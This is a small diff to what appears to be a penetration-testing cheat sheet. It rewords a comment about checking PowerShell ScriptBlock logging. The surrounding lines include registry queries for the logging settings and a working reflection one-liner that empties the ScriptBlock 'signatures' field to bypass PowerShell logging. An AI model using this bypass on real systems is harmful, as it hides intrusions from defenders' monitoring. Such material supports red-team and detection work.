@@ -156,7 +156,7 @@ Others
   Here we set the “signatures” variable with a new empty hashset, meaning that the “force” parameter will never be true, bypassing logging)
   PS c:\> [Ref].Assembly.GetType(“System.Management.Automation.ScriptBlock”).GetField(“signatures”,”NonPublic,static”).SetValue($null, (New-Object ‘System.Collections.Generic.HashSet[string]’))
 
-> Command to check if Powershell Logging is enabled (registry key not set by default)
+> Command to check if Powershell ScriptBlock Logging is enabled (registry key not set by default)
   PS c:\> reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
   PS c:\> reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
 
